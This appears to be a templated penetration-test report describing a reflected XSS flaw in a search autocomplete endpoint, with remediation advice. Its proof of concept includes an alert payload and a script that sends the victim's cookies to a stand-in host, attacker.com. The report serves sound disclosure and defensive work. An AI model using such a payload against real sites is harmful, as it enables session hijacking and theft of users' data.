# Penetration Testing Writeup: XSS in Search Autocomplete

## Executive Summary

A Reflected Cross-Site Scripting (XSS) vulnerability was found in [Target
Application]’s search autocomplete feature during a penetration test. This
allows attackers to inject scripts via the autocomplete query, compromising user
security. This report details the issue and remediation steps.

## Vulnerability Details

- **Vulnerability Type**: Cross-Site Scripting (XSS) - Reflected
- **Severity**: High
- **Affected Component**: Search autocomplete endpoint
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **Location**: `https://[target-application]/autocomplete?term=[input]`
- **Discovered By**: [PenTester Name]
- **Date Discovered**: August 28, 2025

### Description

The autocomplete endpoint reflects user input in the response without
sanitization, allowing script injection that executes in the browser.

### Impact

- **Session Theft**: Cookies can be stolen.
- **Phishing**: Fake forms can capture credentials.
- **Data Leakage**: Autocomplete data can be exfiltrated.
- **Defacement**: Page content can be altered.

### Proof of Concept

1. Visit:
   `https://[target-application]/autocomplete?term=<script>alert('XSS');</script>`.
2. Observe an alert box.
3. Malicious payload:
   `<script>fetch('https://attacker.com/steal?cookie='+document.cookie);</script>`.

### Steps to Reproduce

1. Navigate to the search page.
2. Enter `<script>alert('XSS');</script>` in the autocomplete field.
3. Trigger the autocomplete and confirm the alert.

## Remediation Recommendations

1. **Input Validation**:
   - Restrict autocomplete inputs to safe characters.
2. **Output Encoding**:
   - Encode outputs before rendering.
3. **Content Security Policy**:
   - Use CSP: `Content-Security-Policy: script-src 'self';`.
4. **Secure Coding**:
   - Train developers on XSS prevention.
5. **Security Testing**:
   - Perform regular audits.

## Conclusion

The XSS vulnerability in [Target Application]’s autocomplete feature requires
urgent remediation to protect users.

## References

- OWASP XSS Prevention Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- CWE-79: https://cwe.mitre.org/data/definitions/79.html

![Autocomplete XSS Example](https://example.com/images/autocomplete-xss-example.png)
